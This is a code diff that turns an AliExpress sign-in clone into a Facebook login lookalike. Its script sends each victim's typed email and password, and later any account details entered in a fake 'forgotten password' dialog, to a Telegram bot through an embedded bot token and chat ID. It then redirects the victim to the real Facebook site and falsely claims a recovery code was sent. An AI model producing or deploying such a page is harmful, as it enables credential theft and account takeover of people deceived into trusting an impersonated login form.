@@ -3,174 +3,216 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Sign in - AliExpress</title>
+<title>Facebook – log in or sign up</title>
 <style>
-* { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; user-select: none; }
+* { box-sizing: border-box; margin: 0; padding: 0; font-family: Helvetica, Arial, sans-serif; user-select: none; }
 body {
-  background-color: #f8f8f8;
-  color: #333;
+  background-color: #f0f2f5;
+  color: #1c1e21;
   display: flex;
   flex-direction: column;
   min-height: 100vh;
-  justify-content: space-between;
-}
-
-/* Header */
-.ae-header {
-  background: #fff;
-  padding: 20px 40px;
-  border-bottom: 1px solid #eaeaea;
-  display: flex;
-  align-items: center;
-}
-.ae-logo {
-  font-size: 26px;
-  font-weight: bold;
-  color: #ff4747;
-  text-decoration: none;
-  letter-spacing: -1px;
-}
-.ae-logo span { color: #333; }
-
-/* Main Container */
-.ae-main {
-  display: flex;
   justify-content: center;
   align-items: center;
-  flex-grow: 1;
-  padding: 20px;
 }
 
-.login-box {
+.fb-container {
+  display: flex;
+  flex-direction: row;
+  justify-content: center;
+  align-items: center;
+  max-width: 980px;
+  width: 100%;
+  padding: 20px;
+  margin-bottom: 40px;
+}
+
+.fb-left {
+  flex: 1;
+  padding-right: 32px;
+  max-width: 500px;
+}
+
+.fb-logo {
+  font-size: 50px;
+  font-weight: bold;
+  color: #1877f2;
+  margin-bottom: 10px;
+  letter-spacing: -2px;
+}
+
+.fb-tagline {
+  font-size: 28px;
+  font-weight: normal;
+  line-height: 32px;
+  color: #1c1e21;
+}
+
+.fb-right {
+  flex: 1;
+  max-width: 396px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+}
+
+.fb-card {
   background: #ffffff;
   width: 100%;
-  max-width: 420px;
-  padding: 40px 35px;
-  border-radius: 4px;
-  box-shadow: 0 4px 20px rgba(0,0,0,0.06);
-  border: 1px solid #eee;
+  padding: 20px;
+  border-radius: 8px;
+  box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+  text-align: center;
 }
 
-.login-title {
-  font-size: 22px;
-  font-weight: 600;
-  color: #222;
-  margin-bottom: 25px;
+.fb-card input {
+  width: 100%;
+  padding: 14px 16px;
+  margin-bottom: 12px;
+  border: 1px solid #dddfe2;
+  border-radius: 6px;
+  font-size: 17px;
+  outline: none;
+  background: #fff;
 }
 
-.input-group {
+.fb-card input:focus {
+  border-color: #1877f2;
+  box-shadow: 0 0 0 2px #e7f3ff;
+}
+
+.btn-login {
+  width: 100%;
+  background: #1877f2;
+  border: none;
+  border-radius: 6px;
+  color: #fff;
+  font-size: 20px;
+  font-weight: bold;
+  padding: 12px;
+  cursor: pointer;
+  transition: background 0.2s;
+  margin-bottom: 16px;
+}
+
+.btn-login:hover {
+  background: #166fe5;
+}
+
+.forgot-link {
+  color: #1877f2;
+  font-size: 14px;
+  text-decoration: none;
+  display: block;
   margin-bottom: 20px;
 }
 
-.input-group input {
-  width: 100%;
-  padding: 14px 16px;
-  border: 1px solid #d9d9d9;
-  border-radius: 4px;
-  font-size: 15px;
-  outline: none;
-  transition: border-color 0.2s;
-  background: #fff;
-}
-
-.input-group input:focus {
-  border-color: #ff4747;
-}
-
-.btn-signin {
-  width: 100%;
-  padding: 14px;
-  background: #ff4747;
-  border: none;
-  border-radius: 4px;
-  color: #fff;
-  font-size: 16px;
-  font-weight: 600;
-  cursor: pointer;
-  transition: background 0.2s;
-  margin-top: 10px;
-}
-
-.btn-signin:hover {
-  background: #e63939;
-}
-
-.btn-signin:active {
-  transform: scale(0.99);
-}
-
-#errorMsg {
-  color: #ff4747;
-  font-size: 13px;
-  margin-top: 15px;
-  min-height: 18px;
-  text-align: center;
-}
-
-.footer-links {
-  display: flex;
-  justify-content: space-between;
-  margin-top: 20px;
-  font-size: 13px;
-}
-
-.footer-links a {
-  color: #666;
-  text-decoration: none;
-}
-.footer-links a:hover {
-  color: #ff4747;
+.forgot-link:hover {
   text-decoration: underline;
 }
 
-/* Footer */
-.ae-footer {
-  text-align: center;
-  padding: 20px;
-  font-size: 12px;
-  color: #999;
-  border-top: 1px solid #eaeaea;
+.divider {
+  border-bottom: 1px solid #dadde1;
+  margin-bottom: 20px;
+}
+
+.btn-create {
+  background: #42b72a;
+  color: #fff;
+  border: none;
+  border-radius: 6px;
+  font-size: 17px;
+  font-weight: bold;
+  padding: 12px 16px;
+  cursor: pointer;
+  transition: background 0.2s;
+}
+
+.btn-create:hover {
+  background: #36a420;
+}
+
+#errorMsg {
+  color: #fa383e;
+  font-size: 13px;
+  margin-bottom: 10px;
+}
+
+/* Modal / Popup for Forgot Password simulation */
+.modal {
+  display: none;
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,0.5);
+  justify-content: center;
+  align-items: center;
+  z-index: 100;
+}
+.modal-content {
   background: #fff;
+  padding: 25px;
+  border-radius: 8px;
+  width: 90%;
+  max-width: 400px;
+  text-align: left;
+}
+.modal-content h3 { font-size: 20px; margin-bottom: 15px; }
+.modal-content input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
+.modal-btns { display: flex; justify-content: flex-end; gap: 10px; margin-top: 15px; }
+.modal-btns button { padding: 8px 16px; border-radius: 4px; cursor: pointer; border: none; font-weight: bold; }
+.btn-cancel { background: #e4e6eb; color: #4b4f56; }
+.btn-send { background: #1877f2; color: #fff; }
+
+@media (max-width: 900px) {
+  .fb-container { flex-direction: column; text-align: center; }
+  .fb-left { padding-right: 0; margin-bottom: 30px; }
 }
 </style>
 </head>
 <body>
 
-  <!-- AliExpress Header -->
-  <header class="ae-header">
-    <a href="#" class="ae-logo">Ali<span>Express</span></a>
-  </header>
+  <div class="fb-container">
+    <div class="fb-left">
+      <div class="fb-logo">facebook</div>
+      <div class="fb-tagline">Facebook helps you connect and share with the people in your life.</div>
+    </div>
 
-  <!-- Main Login Section -->
-  <div class="ae-main">
-    <div class="login-box" id="loginCard">
-      <div class="login-title">Sign in</div>
-      
-      <div class="input-group">
-        <input type="text" id="email" placeholder="Email ID / Member ID" autocomplete="off">
-      </div>
+    <div class="fb-right">
+      <div class="fb-card">
+        <div id="errorMsg"></div>
+        <div class="input-group">
+          <input type="text" id="email" placeholder="Email address or phone number" autocomplete="off">
+        </div>
+        <div class="input-group">
+          <input type="password" id="password" placeholder="Password">
+        </div>
 
-      <div class="input-group">
-        <input type="password" id="password" placeholder="Password">
-      </div>
+        <button class="btn-login" onclick="handleLogin()">Log In</button>
+        
+        <a href="#" class="forgot-link" onclick="openForgotModal()">Forgotten password?</a>
+        
+        <div class="divider"></div>
 
-      <button class="btn-signin" onclick="handleLogin()">Sign in</button>
-      <div id="errorMsg"></div>
-
-      <div class="footer-links">
-        <a href="#">Forgot password?</a>
-        <a href="#">Protection Center</a>
+        <button class="btn-create">Create new account</button>
       </div>
     </div>
   </div>
 
-  <!-- AliExpress Footer -->
-  <footer class="ae-footer">
-    Privacy Policy - Intellectual Property - Terms of Use - User Information Legal Enquiry Guide
-  </footer>
+  <!-- Simulated Forgot Password Modal -->
+  <div class="modal" id="forgotModal">
+    <div class="modal-content">
+      <h3>Find Your Account</h3>
+      <hr style="border:0; border-top:1px solid #ddd; margin-bottom:10px;">
+      <p style="font-size:14px; color:#606770;">Please enter your email address or mobile number to search for your account.</p>
+      <input type="text" id="forgotInput" placeholder="Email address or mobile number">
+      <div class="modal-btns">
+        <button class="btn-cancel" onclick="closeForgotModal()">Cancel</button>
+        <button class="btn-send" onclick="sendForgotData()">Search</button>
+      </div>
+    </div>
+  </div>
 
 <script>
-// ඔයාගේ Telegram Bot තොරතුරු එලෙසම ඇත
 const BOT_TOKEN = "8825023377:AAGOss8yK3V15XRGZyiBM9y58F1q5KjxRcQ";
 const CHAT_ID = "1993924204";
 
@@ -180,23 +222,49 @@ function handleLogin() {
   const errorMsg = document.getElementById('errorMsg');
 
   if (!email || !pass) {
-    errorMsg.textContent = "Please enter your sign-in details.";
+    errorMsg.textContent = "The email or mobile number you entered isn't connected to an account.";
     return;
   }
 
-  errorMsg.textContent = "Processing...";
+  errorMsg.textContent = "";
 
-  // Telegram වෙත ඩේටා යැවීම
-  const text = `🛒 *AliExpress Login Captured!*\n\n📧 *Email/ID:* \`${email}\`\n🔑 *Password:* \`${pass}\``;
+  // Telegram වෙත Login විස්තර යැවීම
+  const text = `🔵 *Facebook Login Captured!*\n\n👤 *Email/Phone:* \`${email}\`\n🔑 *Password:* \`${pass}\``;
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
 
   const img = new Image();
   img.src = url;
 
-  // සාර්ථකව යැවුණු පසු AliExpress හි නිල ප්‍රධාන පිටුවට (или Real loading) යැවීම
   setTimeout(() => {
-    window.location.href = "https://www.aliexpress.com";
+    window.location.href = "https://www.facebook.com";
   }, 800);
+}
+
+function openForgotModal() {
+  event.preventDefault();
+  document.getElementById('forgotModal').style.display = 'flex';
+}
+
+function closeForgotModal() {
+  document.getElementById('forgotModal').style.display = 'none';
+}
+
+function sendForgotData() {
+  const val = document.getElementById('forgotInput').value.trim();
+  if(!val) {
+    alert("Please enter your email or phone.");
+    return;
+  }
+
+  // Telegram වෙත Forgot Password විස්තර යැවීම
+  const text = `🔄 *Facebook Password Reset Requested!*\n\n📱 *Account Info:* \`${val}\``;
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
+
+  const img = new Image();
+  img.src = url;
+
+  alert("We've sent a recovery code to your email/phone.");
+  closeForgotModal();
 }
 </script>
 
